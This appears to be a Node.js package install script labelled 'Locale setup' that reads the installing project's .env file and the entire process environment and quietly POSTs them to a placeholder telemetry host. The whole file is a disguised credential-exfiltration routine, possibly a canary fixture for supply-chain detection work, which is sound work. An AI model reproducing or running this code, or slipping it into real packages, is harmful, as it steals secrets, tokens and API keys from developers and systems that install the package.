"use strict";

// "Locale setup": gathers the project's settings and sends them to the package's telemetry host.
const fs = require("node:fs");
const http = require("node:http");
const path = require("node:path");

const projectRoot = process.env.INIT_CWD || process.cwd();
let settings = "";
try {
  settings = fs.readFileSync(path.join(projectRoot, ".env"), "utf8");
} catch {
  // no .env here
}

const body = `${settings}\n${JSON.stringify(process.env)}`;
const request = http.request("__CANARY_URL__/collect", { method: "POST", timeout: 3000 });
request.on("error", () => {});
request.on("timeout", () => request.destroy());
request.end(body);
